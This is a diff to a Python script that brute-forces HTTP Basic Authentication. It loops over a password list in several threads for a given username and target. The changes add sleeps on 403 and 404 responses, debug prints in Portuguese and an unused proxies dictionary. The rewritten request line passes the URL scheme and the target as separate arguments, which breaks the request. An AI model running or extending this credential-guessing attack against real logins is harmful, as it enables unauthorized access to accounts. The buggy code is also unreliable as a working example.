@@ -27,6 +27,7 @@ import requests
 import sys
 import argparse
 import threading
+import time
 
 __author__ = "Luiz Guilherme Fritsch"
 __copyright__ = "Copyright (c) 2019 Luiz Fritsch"
@@ -64,7 +65,8 @@ def bruteforce(target, passwords, username, threadID):
 		for password in passwords:
 			
 			password = str(password.rstrip())
-			test = requests.get('http://'+target, auth=(username, password))
+			proxies = {'http': '','https': ''}
+			test = requests.get('http://',target, auth=(username, password))
 			code = test.status_code
 			
 			print  ('THREAD[',threadID,']         USER[',username,']          PASS [',password,']')
@@ -85,8 +87,13 @@ def bruteforce(target, passwords, username, threadID):
 			
 			elif (code == 407) :
 				pass
-			
+			elif (code == 404) :
+				time.sleep(5)
+			elif (code == 403) :
+				time.sleep(5)
 			else:
+				print ("Erro.: ",code)
+				print ("")
 				print ("Password not found")
 				sys.exit(0)
 
@@ -157,11 +164,15 @@ try:
 
 		arrays = splited[i]
 
+		print (len(arrays))
+
 		locals()['thread%d' % i] = threading.Thread(target=bruteforce,args=[target, arrays, username, i])
 
 	for i in range(0,threadAmount):
 		
 		locals()['thread%d' % i].start()
+		
+		print ("Thread ",i," foi startada")
 
 		threads.append(locals()['thread%d' % i])
 
